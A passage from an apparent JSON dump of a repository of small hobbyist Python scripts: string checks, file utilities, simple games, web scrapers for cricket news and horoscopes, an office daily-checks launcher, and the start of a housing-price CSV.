          "content": "def palindrome(a): \n   \n    mid = (len(a)-1)//2\n    start = 0\n    last = len(a)-1\n    flag = 0\n  \n    while(start<mid): \n   \n        if (a[start]== a[last]): \n              \n            start += 1\n            last -= 1\n              \n        else: \n            flag = 1\n            break; \n              \n    if flag == 0: \n        print(\"The entered string is palindrome\") \n    else: \n        print(\"The entered string is not palindrome\") \n                  \ndef symmetry(a): \n      \n    n = len(a) \n    flag = 0\n       \n    if n%2: \n        mid = n//2 +1\n    else: \n        mid = n//2\n          \n    start1 = 0\n    start2 = mid \n      \n    while(start1 < mid and start2 < n): \n          \n        if (a[start1]== a[start2]): \n            start1 = start1 + 1\n            start2 = start2 + 1\n        else: \n            flag = 1\n            break\n      \n    if flag == 0: \n        print(\"The entered string is symmetrical\") \n    else: \n        print(\"The entered string is not symmetrical\") \n          \nstring = 'amaama'\npalindrome(string) \nsymmetry(string) \n"
        },
        {
          "name": "check_file.py",
          "type": "blob",
          "size": 2.134765625,
          "content": "# Script Name\t\t: check_file.py\n\n# Author\t\t: Craig Richards\n# Created\t\t: 20 May 2013\n# Last Modified\t\t:\n# Version\t\t: 1.0\n\n# Modifications\t: with statement added to ensure correct file closure\n\n# Description\t: Check a file exists and that we can read the file\nfrom __future__ import print_function\n\nimport os  # Import the Modules\nimport sys  # Import the Modules\n\n\n# Prints usage if not appropriate length of arguments are provided\n\n\ndef usage():\n    print(\"[-] Usage: python check_file.py [filename1] [filename2] ... [filenameN]\")\n\n\n# Readfile Functions which open the file that is passed to the script\ndef readfile(filename):\n    with open(filename, \"r\") as f:  # Ensure file is correctly closed under\n        read_file = f.read()  # all circumstances\n    print(read_file)\n    print()\n    print(\"#\" * 80)\n    print()\n\n\ndef main():\n    # Check the arguments passed to the script\n    if len(sys.argv) >= 2:\n        file_names = sys.argv[1:]\n        filteredfilenames_1 = list(\n            file_names\n        )  # To counter changing in the same list which you are iterating\n        filteredfilenames_2 = list(file_names)\n        # Iterate for each filename passed in command line argument\n        for filename in filteredfilenames_1:\n            if not os.path.isfile(filename):  # Check the File exists\n                print(\"[-] \" + filename + \" does not exist.\")\n                filteredfilenames_2.remove(\n                    filename\n                )  # remove non existing files from fileNames list\n                continue\n\n            # Check you can read the file\n            if not os.access(filename, os.R_OK):\n                print(\"[-] \" + filename + \" access denied\")\n                # remove non readable fileNames\n                filteredfilenames_2.remove(filename)\n                continue\n\n        # Read the content of each file that both exists and is readable\n        for filename in filteredfilenames_2:\n            # Display Message and read the file contents\n            print(\"[+] Reading from : \" + filename)\n            readfile(filename)\n\n    else:\n        usage()  # Print usage if not all parameters passed/Checked\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "check_for_sqlite_files.py",
          "type": "blob",
          "size": 1.361328125,
          "content": "# Script Name\t: check_for_sqlite_files.py\r\n# Author\t\t: Craig Richards\r\n# Created\t\t: 07 June 2013\r\n# Last Modified\t: 14 February 2016\r\n# Version\t\t: 1.0.1\r\n\r\n# Modifications\t: 1.0.1 - Remove unecessary line and variable on Line 21\r\n\r\n# Description\t: Scans directories to check if there are any sqlite files in there\r\n\r\nfrom __future__ import print_function\r\n\r\nimport os\r\n\r\n\r\ndef isSQLite3(filename):\r\n    from os.path import isfile, getsize\r\n\r\n    if not isfile(filename):\r\n        return False\r\n    if getsize(filename) < 100:  # SQLite database file header is 100 bytes\r\n        return False\r\n    else:\r\n        fd = open(filename, \"rb\")\r\n        header = fd.read(100)\r\n        fd.close()\r\n\r\n        if header[0:16] == \"SQLite format 3\\000\":\r\n            return True\r\n        else:\r\n            return False\r\n\r\n\r\nlog = open(\"sqlite_audit.txt\", \"w\")\r\nfor r, d, f in os.walk(r\".\"):\r\n    for files in f:\r\n        if isSQLite3(files):\r\n            print(files)\r\n            print(\r\n                \"[+] '%s' **** is a SQLITE database file **** \" % os.path.join(r, files)\r\n            )\r\n            log.write(\"[+] '%s' **** is a SQLITE database file **** \" % files + \"\\n\")\r\n        else:\r\n            log.write(\r\n                \"[-] '%s' is NOT a sqlite database file\" % os.path.join(r, files) + \"\\n\"\r\n            )\r\n            log.write(\"[-] '%s' is NOT a sqlite database file\" % files + \"\\n\")\r\n"
        },
        {
          "name": "check_input.py",
          "type": "blob",
          "size": 1.1640625,
          "content": "def get_user_input(start, end):\n    \"\"\"\n    input: two integer values\n           lower limit 'start' and maximum 'end'\n           the arguments aren't inclusive.\n\n    output: if reading successful then returns the read integer.\n\n    purpose: reads from command-line a integer in the given bounds.\n             while input invalid asks user again\n    \"\"\"\n\n    loop = True  # controls while-loop\n\n    while loop:\n\n        try:\n\n            # reads and converts the input from the console.\n            user_input = int(input(\"Enter Your choice: \"))\n\n            # checks whether input is in the given bounds.\n            if user_input > end or user_input < start:\n\n                # error case\n                print(\"Please try again. Not in valid bounds.\")\n\n            else:\n\n                # valid case\n                loop = False  # aborts while-loop\n\n        except ValueError:\n\n            # error case\n            print(\"Please try again. Only numbers\")\n\n    return user_input\n\n\nx = get_user_input(1, 6)\nprint(x)\n# Asks user to enter something, ie. a number option from a menu.\n# While type != interger, and not in the given range,\n# Program gives error message and asks for new input.\n"
        },
        {
          "name": "check_internet_con.py",
          "type": "blob",
          "size": 0.7216796875,
          "content": "from sys import argv\n\ntry:\n    # For Python 3.0 and later\n    from urllib.error import URLError\n    from urllib.request import urlopen\nexcept ImportError:\n    # Fall back to Python 2's urllib2\n    from urllib2 import URLError, urlopen\n\n\ndef checkInternetConnectivity():\n    try:\n        url = argv[1]\n        print(url)\n        protocols = [\"https://\", \"http://\"]\n        if not any(x for x in protocols if x in url):\n            url = \"https://\" + url\n        print(\"URL:\" + url)\n    except BaseException:\n        url = \"https://google.com\"\n    try:\n        urlopen(url, timeout=2)\n        print(f'Connection to \"{url}\" is working')\n\n    except URLError as E:\n        print(\"Connection error:%s\" % E.reason)\n\n\ncheckInternetConnectivity()\n"
        },
        {
          "name": "check_prime.py",
          "type": "blob",
          "size": 0.9599609375,
          "content": "# Author:       Tan Duc Mai\r\n# Email:        tan.duc.work@gmail.com\r\n# Description:  Three different functions to check whether a given number is a prime.\r\n#               Return True if it is a prime, False otherwise.\r\n#               Those three functions, from a to c, decreases in efficiency\r\n#               (takes longer time).\r\n\r\nfrom math import sqrt\r\n\r\n\r\ndef is_prime_a(n):\r\n    if n < 2:\r\n        return False\r\n    sqrt_n = int(sqrt(n))\r\n    for i in range(2, sqrt_n + 1):\r\n        if n % i == 0:\r\n            return False\r\n    return True\r\n\r\n\r\ndef is_prime_b(n):\r\n    if n > 1:\r\n        if n == 2:\r\n            return True\r\n        else:\r\n            for i in range(2, n):\r\n                if n % i == 0:\r\n                    return False\r\n            return True\r\n    return False\r\n\r\n\r\ndef is_prime_c(n):\r\n    divisible = 0\r\n    for i in range(1, n + 1):\r\n        if n % i == 0:\r\n            divisible += 1\r\n    if divisible == 2:\r\n        return True\r\n    return False\r\n"
        },
        {
          "name": "chicks_n_rabs.py",
          "type": "blob",
          "size": 0.5517578125,
          "content": "\"\"\"\nAuthor Anurag Kumar(mailto:anuragkumarak95@gmail.com)\n\nModule to solve a classic ancient Chinese puzzle:\nWe count 35 heads and 94 legs among the chickens and rabbits in a farm. \nHow many rabbits and how many chickens do we have?\n\n\"\"\"\n\n\ndef solve(num_heads, num_legs):\n    ns = \"No solutions!\"\n    for i in range(num_heads + 1):\n        j = num_heads - i\n        if 2 * i + 4 * j == num_legs:\n            return i, j\n    return ns, ns\n\n\nif __name__ == \"__main__\":\n    numheads = 35\n    numlegs = 94\n\n    solutions = solve(numheads, numlegs)\n    print(solutions)\n"
        },
        {
          "name": "classicIndianCardMatch.py",
          "type": "blob",
          "size": 3.4326171875,
          "content": "import random\nimport time\n\nSUITS = (\"C\", \"S\", \"H\", \"D\")\nRANKS = (\"A\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"T\", \"J\", \"Q\", \"K\")\nVALUES = {\n    \"A\": 1,\n    \"2\": 2,\n    \"3\": 3,\n    \"4\": 4,\n    \"5\": 5,\n    \"6\": 6,\n    \"7\": 7,\n    \"8\": 8,\n    \"9\": 9,\n    \"T\": 10,\n    \"J\": 10,\n    \"Q\": 10,\n    \"K\": 10,\n}\n\n\nclass card:\n    def __init__(self, suit, rank):\n        if (suit in SUITS) and (rank in RANKS):\n            self.suit = suit\n            self.rank = rank\n        else:\n            self.suit = None\n            self.rank = None\n            print(\"Invalid card: \", suit, rank)\n\n    def __str__(self):\n        return self.suit + self.rank\n\n    def getRank(self):\n        return self.rank\n\n    def getSuit(self):\n        return self.suit\n\n\nclass deck:\n    def __init__(self):\n        self.deck = [card(suit, rank) for suit in SUITS for rank in RANKS]\n\n    def shuffle(self):\n        random.shuffle(self.deck)\n\n    def dealCard(self):\n        return random.choice(self.deck)\n\n    def __str__(self):\n        print(self.deck)\n\n\n# Begin play\n# create two decks, one for each player.\nprint(\"Gathering brand new two decks of cards............\\n\")\ndeck1 = deck()\ndeck2 = deck()\ntime.sleep(5)\nprint(\"..........decks ready!!!\\n\")\nprint(\"Combining and shuffling both the decks..\")\ntime.sleep(10)\n# Shuffle the decks\ndeck1.shuffle()\ndeck2.shuffle()\n# combine both the shuffled decks\ncombinedDeck = deck1.deck + deck2.deck\n# ReShuffle the combined deck, cut it and distribute to two players.\nrandom.shuffle(combinedDeck)\nprint(\"....decks have been combined and shuffled...\\n\")\nprint(\"------------------------------------------\\n\")\ninput(\"Enter a key to cut the deck..\\n\")\nplayer1 = combinedDeck[0:52]\nplayer2 = combinedDeck[52:]\nprint(\n    \"Deck has been split into two and Human get a half and computer gets the other...\\n\"\n)\n\n# Begin play:\nprint(\"------------------------------------------\\n\")\nprint(\"player1 == Human\\n\")\nprint(\"player2 == Computer\\n\")\nprint(\"------------------------------------------\\n\")\nprint(\"player1 goes first...hit any key to place the card on the pile..\\n\")\n\ncenterPile = []\ncurrentPlayer2Card = None\n\nwhile (\n    len(player1) != 0 and len(player2) != 0\n):  # this needs a fix as it goes on an infinite loop on a success.\n    switchPlayer = True\n    while switchPlayer == True:\n        for card in range(len(player1)):\n            input(\"Enter any key to place a card!!!\\n\")\n            currentPlayer1Card = player1[card].rank\n            print(\"Your current card's rank: {}\".format(currentPlayer1Card))\n            centerPile.append(player1[card])\n            player1.pop(card)\n            switchPlayer = False\n            if currentPlayer2Card == currentPlayer1Card:\n                player1 = player1 + centerPile\n                print(\n                    \"The human got a match and takes all the cards from center pile..\"\n                )\n            break\n    while switchPlayer == False:\n        for card in range(len(player2)):\n            currentPlayer2Card = player2[card].rank\n            print(\"Computer's current card's rank: {}\".format(currentPlayer2Card))\n            centerPile.append(player2[card])\n            player2.pop(card)\n            switchPlayer = True\n            if currentPlayer1Card == currentPlayer2Card:\n                player2 = player2 + centerPile\n                print(\"Computer got a match and takes all the cards from center pile..\")\n            break\n\nprint(\"GAME OVER!!!\\n\")\n\nprint(\"Human has {} cards and computer has {}..\".format(len(player1), len(player2)))\n"
        },
        {
          "name": "cli_master",
          "type": "tree",
          "content": null
        },
        {
          "name": "cloning_a_list.py",
          "type": "blob",
          "size": 0.2587890625,
          "content": "# Python program to copy or clone a list \n# Using the Slice Operator \ndef Cloning(li1): \n    return li1[:]\n  \n# Driver Code \nli1 = [\n    4, \n    8, \n    2, \n    10, \n    15, \n    18\n] \nli2 = Cloning(li1) \nprint(\"Original List:\", li1) \nprint(\"After Cloning:\", li2) \n"
        },
        {
          "name": "colorma_as_color.py",
          "type": "blob",
          "size": 0.7470703125,
          "content": "import colorama as color\n\n\nfrom colorama import Fore, Back, Style\n\nprint(Fore.RED + \"some red text\")\nprint(Back.GREEN + \"and with a green background\")\nprint(\"So any text will be in green background?\")\n\nprint(\"So is it a wrapper of some sort?\")\nprint(\"dark_angel wasn't using it in her code.\")\nprint(\"she was just being using direct ANSI codes.\")\nprint(Style.RESET_ALL)\nprint(Fore.BRIGHT_RED + \"some bright red text\")\nprint(Back.WHITE + \"and with a white background\")\nprint(\"Will need to study about what is ANSI codes.\")\nprint(Style.DIM + \"and in dim text\")\nprint(Style.RESET_ALL)\nprint(\"back to normal now\")\n\n\n# …or, Colorama can be used in conjunction with existing ANSI libraries such as the venerable Termcolor the fabulous Blessings, or the incredible _Rich."
        },
        {
          "name": "colour spiral.py",
          "type": "blob",
          "size": 0.7294921875,
          "content": "# import turtle\n\nimport turtle\n \n# defining colors\n\ncolors = ['red', 'yellow', 'green', 'purple', 'blue', 'orange']\n \n# setup turtle pen\n\nt= turtle.Pen()\n \n# changes the speed of the turtle\n\nt.speed(10)\n \n# changes the background color\n\nturtle.bgcolor(\"black\")\n \n# make spiral_web\n\nfor x in range(200):\n\n    t.pencolor(colors[x%6]) # setting color\n\n    t.width(x/100 + 1) # setting width\n\n    t.forward(x) # moving forward\n\n    t.left(59) # moving left\n \nturtle.done()\n\nt.speed(10)\n \n\nturtle.bgcolor(\"black\") # changes the background color\n \n# make spiral_web\n\nfor x in range(200):\n\n    t.pencolor(colors[x%6]) # setting color\n\n    t.width(x/100 + 1) # setting width\n\n    t.forward(x) # moving forward\n\n    t.left(59) # moving left\n \nturtle.done()"
        },
        {
          "name": "communication",
          "type": "tree",
          "content": null
        },
        {
          "name": "consonant.py",
          "type": "blob",
          "size": 0.5029296875,
          "content": "my_string = input(\"Enter a string to count number of consonants: \")\nstring_check = [\n    \"a\",\n    \"e\",\n    \"i\",\n    \"o\",\n    \"u\",\n    \"A\",\n    \"E\",\n    \"I\",\n    \"O\",\n    \"U\",\n]  # list for checking vowels\n\n\ndef count_con(string):\n    c = 0\n    for i in range(len(string)):\n        if (\n            string[i] not in string_check\n        ):  # counter increases if the character is not vowel\n            c += 1\n    return c\n\n\ncounter = count_con(my_string)\nprint(f\"Number of consonants in {my_string} is {counter}.\")\n"
        },
        {
          "name": "convert celsius into fahrenheit.py",
          "type": "blob",
          "size": 0.14453125,
          "content": "cels= float(input(\"enter temp in celsius\"))\nprint(\"temprature in celsius is :\",cels)\nfahr = cels*9/5+32\nprint(\"temprature in fahrenhite is :\",fahr)\n"
        },
        {
          "name": "convert_time.py",
          "type": "blob",
          "size": 0.7646484375,
          "content": "from __future__ import print_function\n\n# Created by sarathkaul on 12/11/19\n\n\ndef convert_time(input_str):\n    # Checking if last two elements of time\n    # is AM and first two elements are 12\n    if input_str[-2:] == \"AM\" and input_str[:2] == \"12\":\n        return \"00\" + input_str[2:-2]\n\n    # remove the AM\n    elif input_str[-2:] == \"AM\":\n        return input_str[:-2]\n\n    # Checking if last two elements of time\n    # is PM and first two elements are 12\n    elif input_str[-2:] == \"PM\" and input_str[:2] == \"12\":\n        return input_str[:-2]\n\n    else:\n        # add 12 to hours and remove PM\n        return str(int(input_str[:2]) + 12) + input_str[2:8]\n\n\nif __name__ == \"__main__\":\n    input_time = input(\"Enter time you want to convert: \")\n    print(convert_time(input_time))\n"
        },
        {
          "name": "convert_wind_direction_to_degrees.py",
          "type": "blob",
          "size": 0.576171875,
          "content": "def degrees_to_compass(degrees):\n    directions = [\"N\", \"NE\", \"E\", \"SE\", \"S\", \"SW\", \"W\", \"NW\"]\n    index = round(degrees / 45) % 8\n    return directions[index]\n\n# Taking input from the user\nwhile True:\n    try:\n        degrees = float(input(\"Enter the wind direction in degrees (0-359): \"))\n        if degrees < 0 or degrees >= 360:\n            raise ValueError(\"Degrees must be between 0 and 359\")\n        break\n    except ValueError as ve:\n        print(f\"Error: {ve}\")\n        continue\n\n\ncompass_direction = degrees_to_compass(degrees)\nprint(f\"{degrees} degrees is {compass_direction}\")\n"
        },
        {
          "name": "count the numbers of two vovels.py",
          "type": "blob",
          "size": 0.3896484375,
          "content": "# Program to count the number of each vowels\n\n# string of vowels\nvowels = 'aeiou'\n\nip_str = 'Hello, have you tried our tutorial section yet?'\n\n# make it suitable for caseless comparisions\nip_str = ip_str.casefold()\n\n# make a dictionary with each vowel a key and value 0\ncount = {}.fromkeys(vowels,0)\n\n# count the vowels\nfor char in ip_str:\n   if char in count:\n       count[char] += 1\n\nprint(count)\n"
        },
        {
          "name": "create password validity in python.py",
          "type": "blob",
          "size": 0.5595703125,
          "content": "import time\r\npwd=input(\"Enter your password: \")    #any password u want to set\r\n\r\ndef IInd_func():\r\n  count1=0\r\n  for j in range(5):\r\n    a=0\r\n    count=0\r\n    user_pwd = input(\"Enter remember password: \")        #password you remember\r\n    for i in range(len(pwd)):\r\n      if user_pwd[i] == pwd[a]:       #comparing remembered pwd with fixed pwd\r\n        a +=1\r\n        count+=1 \r\n    if count==len(pwd):\r\n      print(\"correct pwd\")\r\n      break\r\n    else:\r\n      count1 += 1\r\n      print(\"not correct\")\r\n  if count1==5:\r\n    time.sleep(30)\r\n    IInd_func()\r\n\r\nIInd_func()"
        },
        {
          "name": "create_dir_if_not_there.py",
          "type": "blob",
          "size": 0.9228515625,
          "content": "# Script Name   : create_dir_if_not_there.py\n# Author        : Craig Richards\n# Created       : 09th January 2012\n# Last Modified : 22nd October 2015\n# Version       : 1.0.1\n# Modifications : Added exceptions\n#               : 1.0.1 Tidy up comments and syntax\n#\n# Description   : Checks to see if a directory exists in the users home directory, if not then create it\n\nimport os  # Import the OS module\n\nMESSAGE = \"The directory already exists.\"\nTESTDIR = \"testdir\"\ntry:\n    home = os.path.expanduser(\n        \"~\"\n    )  # Set the variable home by expanding the user's set home directory\n    print(home)  # Print the location\n\n    if not os.path.exists(\n        os.path.join(home, TESTDIR)\n    ):  # os.path.join() for making a full path safely\n        os.makedirs(\n            os.path.join(home, TESTDIR)\n        )  # If not create the directory, inside their home directory\n    else:\n        print(MESSAGE)\nexcept Exception as e:\n    print(e)\n"
        },
        {
          "name": "cricket_live_score.py",
          "type": "blob",
          "size": 0.4580078125,
          "content": "from urllib.request import urlopen as uReq\n\nfrom bs4 import BeautifulSoup as soup\n\nmy_url = \"http://www.cricbuzz.com/\"\nClient = uReq(my_url)\n\nhtml_page = Client.read()\nClient.close()\n\nsoup_page = soup(html_page, \"html.parser\")\n\nscore_box = soup_page.findAll(\"div\", {\"class\": \"cb-col cb-col-25 cb-mtch-blk\"})\nscore_box_len = len(score_box)\nprint(score_box_len)\nfor i in range(score_box_len):\n    print(score_box[i].a[\"title\"])\n    print(score_box[i].a.text)\n    print()\n"
        },
        {
          "name": "cricket_news.py",
          "type": "blob",
          "size": 0.7041015625,
          "content": "from bs4 import BeautifulSoup\r\nimport requests\r\nimport pyttsx3\r\n\r\nengine = pyttsx3.init()\r\nvoices = engine.getProperty(\"voices\")\r\nengine.setProperty(\"voice\", voices[0].id)\r\n\r\n\r\ndef speak(audio):\r\n    engine.say(audio)\r\n    engine.runAndWait()\r\n\r\n\r\nurl = \"https://www.cricbuzz.com/cricket-news/latest-news\"\r\n\r\nans = requests.get(url)\r\n\r\nsoup = BeautifulSoup(ans.content, \"html.parser\")\r\n\r\nanchors = soup.find_all(\"a\", class_=\"cb-nws-hdln-ancr text-hvr-underline\")\r\ni = 1\r\nspeak(\"Welcome to sports news headlines!\")\r\nfor anchor in anchors:\r\n    speak(anchor.get_text())\r\n    i += 1\r\n    if i == 11:\r\n        break\r\n    speak(\"Moving on next sports headline..\")\r\nspeak(\"These all are major headlines, have a nice day SIR\")\r\n"
        },
        {
          "name": "currency converter",
          "type": "tree",
          "content": null
        },
        {
          "name": "daily_checks.py",
          "type": "blob",
          "size": 3.58203125,
          "content": "# Script Name\t: daily_checks.py\r\n# Author\t\t: Craig Richards\r\n# Created\t\t: 07th December 2011\r\n# Last Modified\t: 01st May 2013\r\n# Version\t\t: 1.5\r\n\"\"\"\r\nModifications\t: 1.1 Removed the static lines for the putty sessions, it now reads a file, loops through and makes the connections.\r\n                : 1.2 Added a variable filename=sys.argv[0] , as when you use __file__ it errors when creating an exe with py2exe.\r\n                : 1.3 Changed the server_list.txt file name and moved the file to the config directory.\r\n                : 1.4 Changed some settings due to getting a new pc\r\n                : 1.5 Tidy comments and syntax\r\n\r\nDescription\t: This simple script loads everything I need to carry out the daily checks for our systems.\r\n\"\"\"\r\nimport os\r\nimport platform  # Load Modules\r\nimport subprocess\r\nimport sys\r\nfrom time import strftime  # Load just the strftime Module from Time\r\n\r\n\r\ndef clear_screen():  # Function to clear the screen\r\n    if os.name == \"posix\":  # Unix/Linux/MacOS/BSD/etc\r\n        os.system(\"clear\")  # Clear the Screen\r\n    elif os.name in (\"nt\", \"dos\", \"ce\"):  # DOS/Windows\r\n        os.system(\"CLS\")  # Clear the Screen\r\n\r\n\r\ndef print_docs():  # Function to print the daily checks automatically\r\n    print(\"Printing Daily Check Sheets:\")\r\n    # The command below passes the command line string to open word, open the document, print it then close word down\r\n    subprocess.Popen(\r\n        [\r\n            \"C:\\\\Program Files (x86)\\Microsoft Office\\Office14\\winword.exe\",\r\n            \"P:\\\\\\\\Documentation\\\\Daily Docs\\\\Back office Daily Checks.doc\",\r\n            \"/mFilePrintDefault\",\r\n            \"/mFileExit\",\r\n        ]\r\n    ).communicate()\r\n\r\n\r\ndef putty_sessions(conffilename):  # Function to load the putty sessions I need\r\n    # Open the file server_list.txt, loop through reading each line\r\n    #  1.1 -Changed - 1.3 Changed name to use variable conffilename\r\n    for server in open(conffilename):\r\n        subprocess.Popen((\"putty -load \" + server))  # Open the PuTTY sessions - 1.1\r\n\r\n\r\ndef rdp_sessions():\r\n    print(\"Loading RDP Sessions:\")\r\n    subprocess.Popen(\r\n        \"mstsc eclr.rdp\"\r\n    )  # Open up a terminal session connection and load the euroclear session\r\n\r\n\r\ndef euroclear_docs():\r\n    # The command below opens IE and loads the Euroclear password document\r\n    subprocess.Popen(\r\n        '\"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\"'\r\n        '\"file://fs1\\pub_b\\Pub_Admin\\Documentation\\Settlements_Files\\PWD\\Eclr.doc\"'\r\n    )\r\n\r\n\r\n# End of the functions\r\n\r\n\r\n# Start of the Main Program\r\ndef main():\r\n    filename = sys.argv[0]  # Create the variable filename\r\n    confdir = os.getenv(\r\n        \"my_config\"\r\n    )  # Set the variable confdir from the OS environment variable - 1.3\r\n    conffile = \"daily_checks_servers.conf\"  # Set the variable conffile - 1.3\r\n    # Set the variable conffilename by joining confdir and conffile together - 1.3\r\n    conffilename = os.path.join(confdir, conffile)\r\n    clear_screen()  # Call the clear screen function\r\n\r\n    # The command below prints a little welcome message, as well as the script name,\r\n    # the date and time and where it was run from.\r\n    print(\r\n        \"Good Morning \" + os.getenv(\"USERNAME\") + \", \" + filename,\r\n        \"ran at\",\r\n        strftime(\"%Y-%m-%d %H:%M:%S\"),\r\n        \"on\",\r\n        platform.node(),\r\n        \"run from\",\r\n        os.getcwd(),\r\n    )\r\n\r\n    print_docs()  # Call the print_docs function\r\n    putty_sessions(conffilename)  # Call the putty_session function\r\n    rdp_sessions()  # Call the rdp_sessions function\r\n    euroclear_docs()  # Call the euroclear_docs function\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n"
        },
        {
          "name": "daily_horoscope.py",
          "type": "blob",
          "size": 3.4970703125,
          "content": "from bs4 import BeautifulSoup\nimport requests\n\n\"\"\"\n   this check_sign function checks and returns the zodiac sign\n   by day and month of your birth\n\n\"\"\"\n\n\ndef check_sign():\n    your_birth_day = input(\"enter your birthday day number> \")\n    your_birth_month = input(\"cool, and the month number, please> \")\n    if (int(your_birth_month) == 12 and int(your_birth_day) >= 22) or (\n        int(your_birth_month) == 1 and int(your_birth_day) <= 19\n    ):\n        sign = \"Capricorn\"\n    elif (int(your_birth_month) == 1 and int(your_birth_day) >= 20) or (\n        int(your_birth_month) == 2 and int(your_birth_day) <= 17\n    ):\n        sign = \"Aquarium\"\n    elif (int(your_birth_month) == 2 and int(your_birth_day) >= 18) or (\n        int(your_birth_month) == 3 and int(your_birth_day) <= 19\n    ):\n        sign = \"Pices\"\n    elif (int(your_birth_month) == 3 and int(your_birth_day) >= 20) or (\n        int(your_birth_month) == 4 and int(your_birth_day) <= 19\n    ):\n        sign = \"Aries\"\n    elif (int(your_birth_month) == 4 and int(your_birth_day) >= 20) or (\n        int(your_birth_month) == 5 and int(your_birth_day) <= 20\n    ):\n        sign = \"Taurus\"\n    elif (int(your_birth_month) == 5 and int(your_birth_day) >= 21) or (\n        int(your_birth_month) == 6 and int(your_birth_day) <= 20\n    ):\n        sign = \"Gemini\"\n    elif (int(your_birth_month) == 6 and int(your_birth_day) >= 21) or (\n        int(your_birth_month) == 7 and int(your_birth_day) <= 22\n    ):\n        sign = \"Cancer\"\n    elif (int(your_birth_month) == 7 and int(your_birth_day) >= 23) or (\n        int(your_birth_month) == 8 and int(your_birth_day) <= 22\n    ):\n        sign = \"Leo\"\n    elif (int(your_birth_month) == 8 and int(your_birth_day) >= 23) or (\n        int(your_birth_month) == 9 and int(your_birth_day) <= 22\n    ):\n        sign = \"Virgo\"\n    elif (int(your_birth_month) == 9 and int(your_birth_day) >= 23) or (\n        int(your_birth_month) == 10 and int(your_birth_day) <= 22\n    ):\n        sign = \"Libra\"\n    elif (int(your_birth_month) == 10 and int(your_birth_day) >= 23) or (\n        int(your_birth_month) == 11 and int(your_birth_day) <= 21\n    ):\n        sign = \"Scorpio\"\n    elif (int(your_birth_month) == 11 and int(your_birth_day) >= 22) or (\n        int(your_birth_month) == 12 and int(your_birth_day) <= 21\n    ):\n        sign = \"Sagittarius\"\n\n    return sign\n\n\ndef horoscope(zodiac_sign: int, day: str) -> str:\n    url = (\n        \"https://www.horoscope.com/us/horoscopes/general/\"\n        f\"horoscope-general-daily-{day}.aspx?sign={zodiac_sign}\"\n    )\n    soup = BeautifulSoup(requests.get(url).content, \"html.parser\")\n    return soup.find(\"div\", class_=\"main-horoscope\").p.text\n\n\nif __name__ == \"__main__\":\n    print(\"Daily Horoscope. \\n\")\n    print(\n        \"enter your Zodiac sign number:\\n\",\n        \"1. Aries\\n\",\n        \"2. Taurus\\n\",\n        \"3. Gemini\\n\",\n        \"4. Cancer\\n\",\n        \"5. Leo\\n\",\n        \"6. Virgo\\n\",\n        \"7. Libra\\n\",\n        \"8. Scorpio\\n\",\n        \"9. Sagittarius\\n\",\n        \"10. Capricorn\\n\",\n        \"11. Aquarius\\n\",\n        \"12. Pisces\\n\",\n        \"\\nor if you're not sure about you sign, type 'calculate'\",\n    )\n    zodiac_sign = input(\"number> \")\n    if zodiac_sign != \"calculate\":\n        print(\"choose some day:\\n\", \"yesterday\\n\", \"today\\n\", \"tomorrow\\n\")\n        day = input(\"enter the day> \")\n        horoscope_text = horoscope(zodiac_sign, day)\n        print(horoscope_text)\n    else:\n        print(\"\\nOk, don't worry. Soon you'll get it just pass this tiny quiz\")\n        print(\"\\nCongratulations! you are defenetly\", check_sign())\n"
        },
        {
          "name": "data.csv",
          "type": "blob",
          "size": 34.380859375,
          "content": "﻿CRIM ,ZN,INDUS,CHAS,NOX,RM,AGE,DIS,RAD,TAX,PTRATIO,B,LSTAT,MEDV\r\n0.00632,18,2.31,0,0.538,6.575,65.2,4.09,1,296,15.3,396.9,4.98,24\r\n0.02731,0,7.07,0,0.469,6.421,78.9,4.9671,2,242,17.8,396.9,9.14,21.6\r\n0.02729,0,7.07,0,0.469,7.185,61.1,4.9671,2,242,17.8,392.83,4.03,34.7\r\n0.03237,0,2.18,0,0.458,6.998,45.8,6.0622,3,222,18.7,394.63,2.94,33.4\r\n0.06905,0,2.18,0,0.458,7.147,54.2,6.0622,3,222,18.7,396.9,5.33,36.2\r\n0.02985,0,2.18,0,0.458,6.43,58.7,6.0622,3,222,18.7,394.12,5.21,28.7\r\n0.08829,12.5,7.87,0,0.524,6.012,66.6,5.5605,5,311,15.2,395.6,12.43,22.9\r\n0.14455,12.5,7.87,0,0.524,6.172,96.1,5.9505,5,311,15.2,396.9,19.15,27.1\r\n0.21124,12.5,7.87,0,0.524,5.631,100,6.0821,5,311,15.2,386.63,29.93,16.5\r\n0.17004,12.5,7.87,0,0.524,6.004,85.9,6.5921,5,311,15.2,386.71,17.1,18.9\r\n0.22489,12.5,7.87,0,0.524,6.377,94.3,6.3467,5,311,15.2,392.52,20.45,15\r\n0.11747,12.5,7.87,0,0.524,6.009,82.9,6.2267,5,311,15.2,396.9,13.27,18.9\r\n0.09378,12.5,7.87,0,0.524,5.889,39,5.4509,5,311,15.2,390.5,15.71,21.7\r\n0.62976,0,8.14,0,0.538,5.949,61.8,4.7075,4,307,21,396.9,8.26,20.4\r\n0.63796,0,8.14,0,0.538,6.096,84.5,4.4619,4,307,21,380.02,10.26,18.2\r\n0.62739,0,8.14,0,0.538,5.834,56.5,4.4986,4,307,21,395.62,8.47,19.9\r\n1.05393,0,8.14,0,0.538,5.935,29.3,4.4986,4,307,21,386.85,6.58,23.1\r\n0.7842,0,8.14,0,0.538,5.99,81.7,4.2579,4,307,21,386.75,14.67,17.5\r\n0.80271,0,8.14,0,0.538,5.456,36.6,3.7965,4,307,21,288.99,11.69,20.2\r\n0.7258,0,8.14,0,0.538,5.727,69.5,3.7965,4,307,21,390.95,11.28,18.2\r\n1.25179,0,8.14,0,0.538,5.57,98.1,3.7979,4,307,21,376.57,21.02,13.6\r\n0.85204,0,8.14,0,0.538,5.965,89.2,4.0123,4,307,21,392.53,13.83,19.6\r\n1.23247,0,8.14,0,0.538,6.142,91.7,3.9769,4,307,21,396.9,18.72,15.2\r\n0.98843,0,8.14,0,0.538,5.813,100,4.0952,4,307,21,394.54,19.88,14.5\r\n0.75026,0,8.14,0,0.538,5.924,94.1,4.3996,4,307,21,394.33,16.3,15.6\r\n0.84054,0,8.14,0,0.538,5.599,85.7,4.4546,4,307,21,303.42,16.51,13.9\r\n0.67191,0,8.14,0,0.538,5.813,90.3,4.682,4,307,21,376.88,14.81,16.6\r\n0.95577,0,8.14,0,0.538,6.047,88.8,4.4534,4,307,21,306.38,17.28,14.8